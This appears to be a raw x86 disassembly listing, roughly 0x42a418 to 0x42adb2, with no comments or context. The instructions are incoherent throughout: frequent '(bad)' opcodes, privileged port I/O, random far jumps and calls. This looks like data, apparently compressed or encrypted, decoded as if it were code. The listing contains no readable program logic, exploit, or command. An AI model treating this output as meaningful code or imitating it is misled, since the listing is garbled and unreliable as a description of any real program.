  42a418:	shl    BYTE PTR [eax],1
  42a41a:	neg    BYTE PTR [edi-0x24fc2c0a]
  42a420:	fbld   TBYTE PTR [edx-0x38]
  42a423:	push   eax
  42a424:	lahf   
  42a425:	push   es
  42a426:	and    al,0x2e
  42a428:	pop    ebx
  42a429:	ret    0x1ebf
  42a42c:	les    eax,FWORD PTR [eax+0x2b]
  42a42f:	xor    eax,0x61dbd9ec
  42a434:	ds mov dl,0x35
  42a437:	popf   
  42a438:	lods   eax,DWORD PTR ds:[esi]
  42a439:	add    al,0x63
  42a43b:	and    al,0x7b
  42a43d:	mov    dl,bh
  42a43f:	or     BYTE PTR [edx-0x77],ah
  42a442:	call   FWORD PTR [edi-0x2b]
  42a445:	add    edx,DWORD PTR [ecx+0x35]
  42a448:	sbb    BYTE PTR [ebp+0x1b2e597c],ch
  42a44e:	leave  
  42a44f:	loopne 0x42a3e9
  42a451:	scas   al,BYTE PTR es:[edi]
  42a452:	or     BYTE PTR [ebx-0x3b17b791],ch
  42a458:	js     0x42a3f0
  42a45a:	xchg   esi,eax
  42a45b:	add    edx,DWORD PTR [esi]
  42a45d:	dec    ecx
  42a45e:	inc    esi
  42a45f:	mov    edx,0xc8f6261b
  42a464:	and    bl,dh
  42a466:	mov    ss,eax
  42a468:	int3   
  42a469:	sbb    DWORD PTR [si-0x7d],edx
  42a46d:	nop
  42a46e:	aam    0x87
  42a470:	xchg   edx,eax
  42a471:	mov    edx,0xa8e3ee29
  42a476:	jnp    0x42a46a
  42a478:	xor    al,0x7a
  42a47a:	mov    ch,0xc6
  42a47c:	mov    al,0x5d
  42a47e:	(bad)  
  42a47f:	fs ret 
  42a481:	sub    al,0x52
  42a483:	and    dh,BYTE PTR [edx-0x1]
  42a486:	retf   0x7ac0
  42a489:	in     eax,dx
  42a48a:	push   ss
  42a48b:	jae    0x42a4c7
  42a48d:	adc    cl,BYTE PTR [edx+0x42]
  42a490:	push   esi
  42a491:	test   eax,0x2c575af1
  42a496:	(bad)  
  42a499:	sti    
  42a49a:	mov    ds:0xa061ab3c,eax
  42a49f:	mov    WORD PTR [edi+0x641e24ec],?
  42a4a5:	push   esp
  42a4a6:	push   ebp
  42a4a7:	and    al,0x90
  42a4a9:	pop    esp
  42a4aa:	mov    bl,0x9d
  42a4ac:	cwde   
  42a4ad:	sahf   
  42a4ae:	jo     0x42a4f2
  42a4b0:	and    esi,ecx
  42a4b2:	xchg   ebx,eax
  42a4b3:	je     0x42a493
	...
  42a515:	add    BYTE PTR [eax],bl
  42a517:	dec    edi
  42a518:	pop    ss
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    bh,dl
  42a523:	mov    dl,0x96
  42a525:	xlat   BYTE PTR ds:[ebx]
  42a526:	jbe    0x42a4ec
  42a528:	add    DWORD PTR [eax],eax
  42a52a:	pop    es
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    cl,bl
  42a52f:	test   cl,0x5b
  42a532:	clc    
  42a533:	sbb    eax,0x303fa8a
  42a538:	sbb    edx,eax
  42a53a:	jmp    0xa4f3:0x5d2f6ae1
  42a541:	or     bh,BYTE PTR [edi+0x9dd5996]
  42a547:	adc    eax,0x3c57938a
  42a54c:	xchg   esi,eax
  42a54d:	inc    esi
  42a54e:	push   0xffffffee
  42a550:	inc    esp
  42a551:	adc    al,0x5b
  42a553:	dec    esp
  42a554:	mov    edi,0xef68ffd1
  42a559:	aam    0xb7
  42a55b:	test   DWORD PTR [edi-0x24],esi
  42a55e:	ficomp WORD PTR [edi]
  42a560:	lock jge 0x42a513
  42a563:	arpl   WORD PTR [esi-0x4066c68b],ax
  42a569:	xchg   edi,eax
  42a56a:	pop    eax
  42a56b:	(bad)  
  42a56c:	fucomp st(0)
  42a56e:	mov    esp,0xb462721b
  42a573:	adc    ebp,DWORD PTR [ebx]
  42a575:	mov    ds:0x3d91b2a,eax
  42a57a:	dec    ebp
  42a57b:	jle    0x42a59e
  42a57d:	jge    0x42a586
  42a57f:	jns    0x42a5e9
  42a581:	fmul   QWORD PTR [ecx+0x21]
  42a584:	xchg   BYTE PTR [esi-0x6bbecefc],bh
  42a58a:	fadd   QWORD PTR ds:0xce5de5f5
  42a590:	retf   0xfd84
  42a593:	(bad)
  42a596:	and    al,0x82
  42a598:	pusha  
  42a599:	outs   dx,DWORD PTR ds:[esi]
  42a59a:	jge    0x42a53a
  42a59c:	pop    es
  42a59d:	daa    
  42a59e:	jae    0x42a5d1
  42a5a0:	iret   
  42a5a1:	pop    edx
  42a5a2:	out    dx,al
  42a5a3:	xor    eax,0x179d4e8e
  42a5a8:	cld    
  42a5a9:	es cmp edi,esi
  42a5ac:	xchg   BYTE PTR [ecx+0x2af3daa3],ah
  42a5b2:	bnd call 0xe92192f5
  42a5b8:	adc    eax,0x1572ae8b
  42a5bd:	outs   dx,BYTE PTR ss:[esi]
  42a5bf:	add    eax,0x668482b1
  42a5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5c5:	jle    0x42a5a4
  42a5c7:	out    0x9a,al
  42a5c9:	inc    esi
  42a5ca:	xchg   edi,eax
  42a5cb:	xor    BYTE PTR [ecx],ah
  42a5cd:	outs   dx,DWORD PTR ds:[esi]
  42a5ce:	dec    edx
  42a5cf:	jns    0x42a57b
  42a5d1:	stos   DWORD PTR es:[edi],eax
  42a5d2:	test   BYTE PTR [esi+0x57],dl
  42a5d5:	out    dx,eax
  42a5d6:	mov    ch,0x6f
  42a5d8:	mov    ebp,0x45b54d7d
  42a5dd:	mov    BYTE PTR [ebx+eax*4-0x6e],0xed
  42a5e2:	(bad)
  42a5e6:	jl     0x42a63f
  42a5e8:	lods   eax,DWORD PTR ds:[esi]
  42a5e9:	imul   edi,DWORD PTR [edi],0x2e
  42a5ec:	aam    0xdb
  42a5ee:	jmp    0x524db9c5
  42a5f3:	ret    
  42a5f4:	imul   esp,ecx,0xffffffa7
  42a5f7:	mov    dl,0x7a
  42a5f9:	sub    BYTE PTR [eax+0x22b6926f],dh
  42a5ff:	xor    al,0xc3
  42a601:	dec    ebp
  42a602:	aaa    
  42a603:	mov    edi,0x34f65091
  42a608:	inc    ebx
  42a609:	into   
  42a60a:	jae    0x42a5bd
  42a60c:	dec    esp
  42a60d:	retf   0x1b12
  42a610:	inc    ebx
  42a611:	out    0xd1,al
  42a613:	sahf   
  42a614:	in     al,0xd4
  42a616:	idiv   dl
  42a618:	push   eax
  42a619:	adc    edx,ebp
  42a61b:	loop   0x42a685
  42a61d:	retf   
  42a61e:	lods   al,BYTE PTR ds:[esi]
  42a61f:	dec    edi
  42a620:	repnz and cl,BYTE PTR [ebx]
  42a623:	pop    ebp
  42a624:	shl    DWORD PTR [ebp+0x5a],1
  42a627:	addr16 aas 
  42a629:	fs aaa 
  42a62b:	sub    ecx,DWORD PTR [edx]
  42a62d:	data16 jge 0x42a66c
  42a630:	adc    esp,DWORD PTR [eax-0x66]
  42a633:	mov    dl,0x37
	...
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0xaf67323b
  42a6a3:	sub    edx,esi
  42a6a5:	fs jge 0x42a66d
  42a6a8:	add    DWORD PTR [eax],eax
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    BYTE PTR ds:0x4c604b8f,al
  42a6b3:	lds    esi,FWORD PTR [edi+0x69]
  42a6b6:	xor    eax,0x1710b192
  42a6bb:	(bad)  
  42a6bc:	rep lods al,BYTE PTR ds:[esi]
  42a6be:	jbe    0x42a6f6
  42a6c0:	mov    BYTE PTR [eax],0x8
  42a6c3:	or     ch,bh
  42a6c5:	or     eax,0xfa514e45
  42a6ca:	cwde   
  42a6cb:	into   
  42a6cc:	jecxz  0x42a67f
  42a6ce:	(bad)  
  42a6d0:	add    eax,0x803746a1
  42a6d5:	and    DWORD PTR [ecx-0x2c4250bd],ebx
  42a6db:	mov    edi,0xb3a15e84
  42a6e0:	mov    cl,0xe8
  42a6e2:	xor    DWORD PTR [ebp-0x1060efb3],edi
  42a6e8:	lock adc eax,0xbdda1c93
  42a6ee:	and    al,0x30
  42a6f0:	icebp  
  42a6f1:	ficom  WORD PTR [ebx+0x65]
  42a6f4:	mov    esp,0xac834eea
  42a6f9:	lock and eax,DWORD PTR [esi-0x7fa376e5]
  42a700:	mov    eax,ebx
  42a702:	inc    esp
  42a703:	adc    DWORD PTR [edi],ecx
  42a705:	push   es
  42a706:	into   
  42a707:	loopne 0x42a6a7
  42a709:	sahf   
  42a70a:	inc    eax
  42a70b:	xchg   cl,bh
  42a70d:	adc    eax,0xacab197d
  42a712:	add    al,0x13
  42a714:	add    BYTE PTR [edx+eiz*1],al
  42a717:	(bad)  
  42a718:	fst    QWORD PTR [edx-0x6c]
  42a71b:	fdiv   QWORD PTR [esi]
  42a71d:	push   eax
  42a71e:	pop    ebp
  42a71f:	dec    eax
  42a720:	lods   eax,DWORD PTR ds:[esi]
  42a721:	xlat   BYTE PTR ds:[ebx]
  42a722:	jns    0x42a709
  42a724:	add    dl,BYTE PTR [ecx]
  42a726:	popa   
  42a727:	or     BYTE PTR [eax],ah
  42a729:	xchg   esp,eax
  42a72a:	adc    esp,DWORD PTR ds:0x29145518
  42a730:	fnstenv [edx]
  42a732:	pop    eax
  42a733:	je     0x42a751
  42a735:	mov    ecx,0xcef7c58b
  42a73a:	out    dx,al
  42a73b:	pusha  
  42a73c:	pop    es
  42a73d:	and    eax,0x5039e653
  42a742:	xor    BYTE PTR [ebp+0x13],al
  42a745:	push   ebx
  42a746:	rcl    BYTE PTR [edi-0x73ce222e],1
  42a74c:	xchg   ebx,eax
  42a74d:	xor    eax,0x31697f17
  42a752:	jns    0x42a6fa
  42a754:	das    
  42a755:	mov    al,cl
  42a757:	(bad)  
  42a758:	aad    0xfd
  42a75a:	fdivr  DWORD PTR [ebx-0x66]
  42a75d:	jle    0x42a76b
  42a75f:	xchg   ebx,eax
  42a760:	mov    al,0x44
  42a762:	dec    ebx
  42a763:	add    eax,esp
  42a765:	dec    ebx
  42a766:	stos   BYTE PTR es:[edi],al
  42a767:	out    dx,al
  42a768:	enter  0xd50b,0x3a
  42a76c:	(bad)  
  42a76d:	sbb    esi,esp
  42a76f:	pop    ecx
  42a770:	fisub  WORD PTR [esi]
  42a772:	and    eax,0x2dad3860
  42a777:	adc    dh,0xe1
  42a77a:	add    al,0xe1
  42a77c:	test   al,0xe8
  42a77e:	imul   edx,DWORD PTR [esi-0x4570944f],0x7c
  42a785:	inc    ebx
  42a786:	ret    
  42a787:	sbb    eax,0x2d755912
  42a78c:	jp     0x42a7ea
  42a78e:	pop    edi
  42a78f:	mov    DWORD PTR [ecx],ebp
  42a791:	lods   eax,DWORD PTR ds:[esi]
  42a792:	inc    esi
  42a793:	fsubr  DWORD PTR [esi+0x66c242bb]
  42a799:	int3   
  42a79a:	(bad)  
  42a79b:	xlat   BYTE PTR ds:[ebx]
  42a79c:	pop    esi
  42a79d:	stc    
  42a79e:	sti    
  42a79f:	mov    esp,0xaa3167bf
  42a7a4:	lds    ebx,FWORD PTR [eax+edi*2]
  42a7a7:	fsubr  DWORD PTR ds:0x581cbba1
  42a7ad:	cmp    ah,BYTE PTR [esi]
  42a7af:	enter  0x8317,0x11
  42a7b3:	sub    ebx,DWORD PTR [ecx+0x0]
	...
  42a815:	add    BYTE PTR [edx-0x10409c9b],cl
  42a81b:	mov    edi,0x497a75de
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	mov    ebp,0x84466957
  42a827:	mov    BYTE PTR [ecx],0x0
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR [edx],dh
  42a82f:	add    BYTE PTR [eax+0x69],ch
  42a832:	push   edi
  42a833:	jb     0x42a82e
  42a835:	cwde   
  42a836:	add    esp,DWORD PTR [ebp+0x4ccb79c8]
  42a83c:	mov    dh,al
  42a83e:	mov    eax,0x6d128133
  42a843:	inc    esp
  42a844:	inc    esi
  42a845:	pusha  
  42a846:	call   0x9fe7:0x4836b999
  42a84d:	icebp  
  42a84e:	mov    ah,0xc3
  42a850:	and    esi,DWORD PTR [edx-0x9d87cd9]
  42a856:	push   cs
  42a857:	jo     0x42a848
  42a859:	scas   eax,DWORD PTR es:[edi]
  42a85a:	mov    edx,0xf2bd5ec5
  42a85f:	xchg   ebp,eax
  42a860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a861:	shl    DWORD PTR [edx-0x14ec0abe],1
  42a867:	jmp    0xde95:0xa90abdbb
  42a86e:	mov    ch,0xf6
  42a870:	cmp    BYTE PTR [esi+eiz*1-0x57],dl
  42a874:	jp     0x42a864
  42a876:	jge    0x42a854
  42a878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a879:	xchg   DWORD PTR [esi+0x56],ecx
  42a87c:	push   edx
  42a87d:	mov    bh,0x36
  42a87f:	repz pusha 
  42a881:	loop   0x42a87c
  42a883:	jge    0x42a879
  42a885:	neg    DWORD PTR [edx]
  42a887:	inc    DWORD PTR [ecx]
  42a889:	cdq    
  42a88a:	push   ebp
  42a88b:	xchg   DWORD PTR [edx],esi
  42a88d:	icebp  
  42a88e:	cs ret 
  42a890:	imul   edi,DWORD PTR [edi],0xbfa406bb
  42a896:	jno    0x42a8f3
  42a898:	mov    edx,0x562e67be
  42a89d:	dec    ebx
  42a89e:	arpl   WORD PTR [ecx-0x7b],dx
  42a8a1:	ja     0x42a843
  42a8a3:	stos   DWORD PTR es:[edi],eax
  42a8a4:	(bad)  
  42a8a5:	aas    
  42a8a6:	mov    WORD PTR ds:0x8da06f31,?
  42a8ac:	scas   eax,DWORD PTR es:[edi]
  42a8ad:	dec    ebx
  42a8ae:	adc    eax,0x58f24978
  42a8b3:	aam    0x45
  42a8b5:	int    0x4
  42a8b7:	les    ebp,FWORD PTR [ebp+0x2c]
  42a8ba:	adc    eax,0x15d6aa28
  42a8bf:	bound  ebp,QWORD PTR [ecx+esi*4+0x63ade34d]
  42a8c6:	fadd   st,st(1)
  42a8c8:	xor    bh,0x5a
  42a8cb:	adc    edx,ecx
  42a8cd:	mov    al,ds:0xb56020b9
  42a8d2:	mul    BYTE PTR [edx]
  42a8d4:	pushf  
  42a8d5:	ja     0x42a913
  42a8d7:	(bad)  
  42a8d8:	and    DWORD PTR [ebp-0x38],ebx
  42a8db:	stos   BYTE PTR es:[edi],al
  42a8dc:	jmp    0x5840e5ed
  42a8e1:	in     eax,0x98
  42a8e3:	cli    
  42a8e4:	lea    ebx,[ecx]
  42a8e6:	cwde   
  42a8e7:	sbb    edi,DWORD PTR [eax+0x74]
  42a8ea:	cli    
  42a8eb:	xor    eax,0xec568638
  42a8f0:	fs inc ecx
  42a8f2:	lock add al,0x2a
  42a8f5:	(bad)  
  42a8f7:	outs   dx,BYTE PTR ds:[esi]
  42a8f8:	test   DWORD PTR [edi+0x31c03fd6],ecx
  42a8fe:	mov    ds:0xba065d5d,eax
  42a903:	push   ebx
  42a904:	sar    DWORD PTR [eax-0x4d],cl
  42a907:	mov    ss:0xa4409957,al
  42a90d:	ffreep st(7)
  42a90f:	sub    eax,0x77bb0d66
  42a914:	ror    BYTE PTR [edx-0x2cd28be8],1
  42a91a:	add    eax,0x9a80a05b
  42a91f:	xor    al,0x8a
  42a921:	in     al,dx
  42a922:	inc    ebx
  42a923:	fadd   st,st(7)
  42a925:	popa   
  42a926:	data16 repz or dl,BYTE PTR [ecx-0x32725bbb]
  42a92e:	mov    al,ds:0xb851c2a
  42a933:	push   ecx
  42a934:	and    eax,0x0
	...
  42a995:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a99b:	out    dx,al
  42a99c:	sti    
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     esp,DWORD PTR [ebp+edx*8-0x3874749a]
  42a9a8:	add    DWORD PTR [eax],eax
  42a9aa:	pop    es
  42a9ab:	add    DWORD PTR [eax],eax
  42a9ad:	add    BYTE PTR [edi-0x60478c5e],al
  42a9b3:	fucompp 
  42a9b5:	call   0x72e9:0x526d3dd0
  42a9bc:	ins    DWORD PTR es:[edi],dx
  42a9bd:	div    DWORD PTR [eax-0x141b9e54]
  42a9c3:	imul   edx,ebx,0x2cf1cf42
  42a9c9:	mov    al,ds:0x1db06272
  42a9ce:	icebp  
  42a9cf:	aam    0x3f
  42a9d1:	push   ds
  42a9d2:	and    al,0x6f
  42a9d4:	call   0x579a38cf
  42a9d9:	jae    0x42a987
  42a9db:	fcmovb st,st(4)
  42a9dd:	adc    al,0x7a
  42a9df:	(bad)  
  42a9e0:	dec    edi
  42a9e1:	out    0xa9,al
  42a9e3:	sbb    al,0xf3
  42a9e5:	mov    ch,0x3b
  42a9e7:	cmp    DWORD PTR [edx+0x3b],esp
  42a9ea:	in     eax,dx
  42a9eb:	add    al,0x12
  42a9ed:	cmp    esi,DWORD PTR [eax-0x49451c71]
  42a9f3:	aaa    
  42a9f4:	xlat   BYTE PTR ds:[ebx]
  42a9f5:	add    eax,0xd915cb2a
  42a9fa:	aas    
  42a9fb:	pop    es
  42a9fc:	mov    edx,0x38b664e3
  42aa01:	dec    ebp
  42aa02:	pushf  
  42aa03:	inc    ebp
  42aa04:	and    DWORD PTR [eax+0xc],ebp
  42aa07:	imul   esi,DWORD PTR [esp+eax*1],0xc720f82a
  42aa0e:	fs stc 
  42aa10:	inc    eax
  42aa11:	sar    BYTE PTR [ecx+edx*8-0x76c692b5],1
  42aa18:	sub    BYTE PTR [edx-0x34],dl
  42aa1b:	inc    ebx
  42aa1c:	cmp    al,0xa8
  42aa1e:	out    dx,al
  42aa1f:	mov    esi,ebp
  42aa21:	ss leave 
  42aa23:	mov    ch,0xb8
  42aa25:	jmp    0xe6bb20d5
  42aa2a:	jecxz  0x42aa05
  42aa2c:	dec    esi
  42aa2d:	loopne 0x42a9c2
  42aa2f:	iret   
  42aa30:	test   eax,0xf2684f6a
  42aa35:	dec    edx
  42aa36:	popa   
  42aa37:	mov    ah,0x53
  42aa39:	push   ss
  42aa3a:	test   eax,0x9e30ab36
  42aa3f:	je     0x42a9fe
  42aa41:	xchg   ebp,eax
  42aa42:	sub    cl,BYTE PTR [eax]
  42aa44:	fst    DWORD PTR [edx-0x40]
  42aa47:	push   esp
  42aa48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa49:	dec    eax
  42aa4a:	loope  0x42a9fa
  42aa4c:	pop    esp
  42aa4d:	dec    edi
  42aa4e:	or     ebx,DWORD PTR [ebp-0x48]
  42aa51:	sti    
  42aa52:	retf   0xb443
  42aa55:	aam    0xa8
  42aa57:	inc    ebp
  42aa58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa59:	(bad)  
  42aa5a:	sbb    al,0x14
  42aa5c:	inc    ecx
  42aa5d:	shl    bh,1
  42aa5f:	cwd    
  42aa61:	clc    
  42aa62:	sub    ebx,DWORD PTR [eax+0x6ff11c69]
  42aa68:	out    dx,eax
  42aa69:	stc    
  42aa6a:	mov    ah,0x56
  42aa6c:	(bad)  
  42aa6d:	sub    ch,BYTE PTR [ebx]
  42aa6f:	dec    ebp
  42aa70:	cs js  0x42aab1
  42aa73:	imul   edi,DWORD PTR ss:[esi-0x721df732],0xfffffffd
  42aa7b:	push   esi
  42aa7c:	add    ebp,DWORD PTR [ecx-0x1b298b65]
  42aa82:	xor    ebp,DWORD PTR [edx-0x20]
  42aa85:	call   0x82dd933b
  42aa8a:	mov    eax,0xfcd31fe
  42aa8f:	and    eax,0x8e0e3c36
  42aa94:	mov    esp,0x8be23d80
  42aa99:	fsub   DWORD PTR [ebx+0x7d]
  42aa9c:	jbe    0x42aa34
  42aa9e:	imul   esp,DWORD PTR [ebp-0x35654f6],0xcc5e4d47
  42aaa8:	nop
  42aaa9:	(bad)  
  42aaaa:	and    esi,DWORD PTR [ecx]
  42aaac:	sub    al,0x54
  42aaae:	cmp    eax,0xb614dad3
  42aab3:	in     eax,0x1c
	...
  42ab15:	add    BYTE PTR [esi],bh
  42ab17:	push   cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [ecx+ecx*8+0x6b],eax
  42ab25:	mov    ds:0x1c892,eax
  42ab2a:	pop    es
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [ebx+ebp*2+0x7],dl
  42ab31:	jnp    0x42ab39
  42ab33:	sahf   
  42ab34:	dec    ecx
  42ab35:	in     eax,0x5e
  42ab37:	push   0xc740ad79
  42ab3c:	lods   eax,DWORD PTR ds:[esi]
  42ab3d:	int3   
  42ab3e:	and    esi,esp
  42ab40:	leave  
  42ab41:	stos   BYTE PTR es:[edi],al
  42ab42:	cs xor eax,0x8dcf6ec7
  42ab48:	mov    ah,0xf3
  42ab4a:	fbstp  TBYTE PTR [ebp-0x4c]
  42ab4d:	xchg   ebx,eax
  42ab4e:	inc    esi
  42ab4f:	cli    
  42ab50:	or     al,0x78
  42ab52:	lea    ebp,[esi+ebp*8+0x32342e07]
  42ab59:	out    dx,eax
  42ab5a:	(bad)  
  42ab5c:	dec    esp
  42ab5d:	jecxz  0x42ab92
  42ab5f:	lock xor al,0x26
  42ab62:	enter  0x7b0f,0x49
  42ab66:	sbb    eax,0x9c2c3ace
  42ab6b:	dec    ebx
  42ab6c:	gs dec esp
  42ab6e:	lods   al,BYTE PTR ds:[esi]
  42ab6f:	not    DWORD PTR [edi-0x3f]
  42ab72:	mov    edi,0x6ca69b7a
  42ab77:	cwde   
  42ab78:	call   0x444e:0x36c671a7
  42ab7f:	ins    BYTE PTR es:[edi],dx
  42ab80:	pop    esp
  42ab81:	retf   
  42ab82:	mov    cl,0x94
  42ab84:	and    al,0xa5
  42ab86:	out    0x15,eax
  42ab88:	in     eax,0x70
  42ab8a:	sub    DWORD PTR [eax],eax
  42ab8c:	clc    
  42ab8d:	out    dx,eax
  42ab8e:	in     al,dx
  42ab8f:	dec    edi
  42ab90:	xor    edx,0xd4962f7d
  42ab96:	push   ds
  42ab97:	fsubp  st(5),st
  42ab99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab9a:	xor    eax,0x82285948
  42ab9f:	adc    eax,0x38ec09d5
  42aba4:	mov    ds:0xcb04751c,eax
  42aba9:	dec    ecx
  42abaa:	(bad)  [edx]
  42abac:	cmp    al,0xd9
  42abae:	adc    DWORD PTR [ecx+0x169ec5b8],ecx
  42abb4:	dec    ecx
  42abb5:	add    dh,BYTE PTR [esi]
  42abb7:	cmp    al,0x5b
  42abb9:	mov    ah,BYTE PTR [edi-0x3392e232]
  42abbf:	mov    cl,0x42
  42abc1:	xor    DWORD PTR [ebp-0x16fec1da],edx
  42abc7:	pop    edi
  42abc8:	aas    
  42abc9:	sub    ebx,DWORD PTR [edx]
  42abcb:	cmp    esp,DWORD PTR [ebp+eiz*2-0x41]
  42abcf:	mov    edi,0xba206b78
  42abd4:	mov    ah,0x10
  42abd6:	mov    al,0x72
  42abd8:	cmc    
  42abd9:	bound  ebx,QWORD PTR [esi]
  42abdb:	add    ebx,DWORD PTR [eax+0x3d]
  42abde:	ins    DWORD PTR es:[edi],dx
  42abdf:	or     BYTE PTR [eax-0x23d0a4e0],0x3c
  42abe6:	and    DWORD PTR [edi-0x2610a228],0x2ea2c9c1
  42abf0:	mov    ds:0x40f91acf,eax
  42abf5:	push   edx
  42abf6:	sub    al,0xce
  42abf8:	inc    esi
  42abf9:	imul   esi,DWORD PTR [edx],0xffffff89
  42abfc:	or     bh,bl
  42abfe:	aas    
  42abff:	stos   BYTE PTR es:[edi],al
  42ac00:	and    edi,DWORD PTR ds:0x418a2a60
  42ac06:	pushf  
  42ac07:	dec    esp
  42ac08:	adc    al,0x43
  42ac0a:	push   DWORD PTR [ecx]
  42ac0c:	or     al,0xd9
  42ac0e:	xchg   ecx,eax
  42ac0f:	inc    edi
  42ac10:	jmp    0x42ac49
  42ac12:	and    cl,BYTE PTR [eax-0x55]
  42ac15:	sub    al,0xa8
  42ac17:	std    
  42ac18:	dec    esi
  42ac19:	adc    eax,ebp
  42ac1b:	mov    edx,DWORD PTR [ebp+0x8aa8cfa]
  42ac21:	daa    
  42ac22:	aas    
  42ac23:	push   0xc3df0c41
  42ac28:	iret   
  42ac29:	and    ecx,DWORD PTR [edi]
  42ac2b:	lods   al,BYTE PTR ds:[esi]
  42ac2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac2d:	dec    edi
  42ac2e:	rcr    BYTE PTR [eax+0xef860e2],1
  42ac34:	add    BYTE PTR gs:[eax],al
	...
  42ac93:	add    BYTE PTR [eax],al
  42ac95:	add    cl,ch
  42ac97:	xor    bl,BYTE PTR [edx+edi*1]
  42ac9a:	fistp  QWORD PTR [esi]
  42ac9c:	out    dx,eax
  42ac9d:	repz rcl BYTE PTR [edi+0x3b390a59],cl
  42aca4:	push   ecx
  42aca5:	aaa    
  42aca6:	cdq    
  42aca7:	leave  
  42aca8:	add    DWORD PTR [eax],eax
  42acaa:	pop    es
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    BYTE PTR [ebp+0x65],dl
  42acb0:	jl     0x42acd4
  42acb2:	neg    esi
  42acb4:	mov    ch,0xd2
  42acb6:	sub    DWORD PTR [esi+0x7fb9aec],eax
  42acbc:	sub    al,0x71
  42acbe:	push   edx
  42acbf:	mov    cl,0x82
  42acc1:	add    DWORD PTR [ecx+ecx*8-0x70],esi
  42acc5:	idiv   BYTE PTR [edi+0x1ab23832]
  42accb:	sub    al,bh
  42accd:	pop    ecx
  42acce:	out    dx,eax
  42accf:	mov    dl,0x4d
  42acd1:	adc    al,0x41
  42acd3:	xchg   edx,eax
  42acd4:	mov    DWORD PTR [edx],ebp
  42acd6:	jnp    0x42ac6b
  42acd8:	add    ebx,DWORD PTR [ebx-0x23]
  42acdb:	mov    eax,0xf84b5589
  42ace0:	popf   
  42ace1:	(bad)  
  42ace2:	jnp    0x42acd5
  42ace4:	jmp    0xdea0cbf6
  42ace9:	cmp    ebx,DWORD PTR [ebx-0x5877f692]
  42acef:	stos   BYTE PTR es:[edi],al
  42acf0:	lock ds pop edx
  42acf3:	ror    bl,1
  42acf5:	jns    0x42acbf
  42acf7:	add    BYTE PTR [edi-0x4098d8a],al
  42acfd:	push   eax
  42acfe:	fadd   DWORD PTR [edi+0x18b27c1e]
  42ad04:	shl    edi,cl
  42ad06:	xor    DWORD PTR [ecx+edi*4+0x6e],esi
  42ad0a:	sbb    eax,edx
  42ad0c:	or     DWORD PTR [ecx*1-0x2102bccb],ebp
  42ad13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad14:	aad    0xc9
  42ad16:	pop    ss
  42ad17:	popa   
  42ad18:	loop   0x42ad2b
  42ad1a:	add    BYTE PTR [ebp-0x4dae4aad],ch
  42ad20:	dec    edi
  42ad21:	aad    0xf4
  42ad23:	cmp    dl,BYTE PTR [ebx]
  42ad25:	dec    ebp
  42ad26:	sub    eax,0x6084c062
  42ad2b:	(bad)  
  42ad2d:	jg     0x42ad1e
  42ad2f:	pop    edx
  42ad30:	push   es
  42ad31:	std    
  42ad32:	lods   al,BYTE PTR ds:[esi]
  42ad33:	ds clc 
  42ad35:	add    esi,esi
  42ad37:	cmp    ebp,DWORD PTR [edi+ebx*4-0x2f]
  42ad3b:	sbb    ebp,0x76
  42ad3e:	mov    ah,0x93
  42ad40:	int3   
  42ad41:	push   0x38396d7e
  42ad46:	out    0x7f,eax
  42ad48:	hlt    
  42ad49:	fs and ebx,0x3f
  42ad4d:	sahf   
  42ad4e:	sti    
  42ad4f:	or     eax,0xfd4a806b
  42ad54:	inc    ebx
  42ad55:	jle    0x42ad10
  42ad57:	scas   al,BYTE PTR es:[edi]
  42ad58:	dec    ecx
  42ad59:	mov    dh,0x4
  42ad5b:	clc    
  42ad5c:	mov    edi,DWORD PTR [ebp-0x53]
  42ad5f:	mov    ah,0xaa
  42ad61:	jg     0x42adb2
  42ad63:	fistp  QWORD PTR [ebx+0x17b3dac8]
  42ad69:	jge    0x42ad3c
  42ad6b:	or     al,0xae
  42ad6d:	lea    edi,[ebp+0x10]
  42ad70:	xchg   DWORD PTR [ecx+0x4a7b0f38],ebp
  42ad76:	aam    0xaf
  42ad78:	cli    
  42ad79:	ss aas 
  42ad7b:	iret   
  42ad7c:	fisubr WORD PTR [ecx]
  42ad7e:	loope  0x42ad2f
  42ad80:	out    0x24,eax
  42ad82:	test   eax,0x54b08ac8
  42ad87:	inc    ebx
  42ad88:	jnp    0x42ad4f
  42ad8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad8b:	jecxz  0x42ad43
  42ad8d:	inc    edi
  42ad8e:	push   esp
  42ad8f:	mov    ch,0x78
  42ad91:	push   esi
  42ad92:	aas    
  42ad93:	pop    esp
  42ad94:	mov    al,ds:0xe5d733a9
  42ad99:	push   edx
  42ad9a:	jecxz  0x42ad94
  42ad9c:	or     dl,BYTE PTR [ebp+0x56]
  42ad9f:	(bad)  
  42ada1:	fld    DWORD PTR [ebp-0xfc263e2]
  42ada8:	mov    al,0x68
  42adaa:	rol    DWORD PTR [edx],0x5e
  42adad:	jecxz  0x42adc8
  42adaf:	xchg   BYTE PTR [ecx+0x25],dl
  42adb2:	js     0x42ae2f
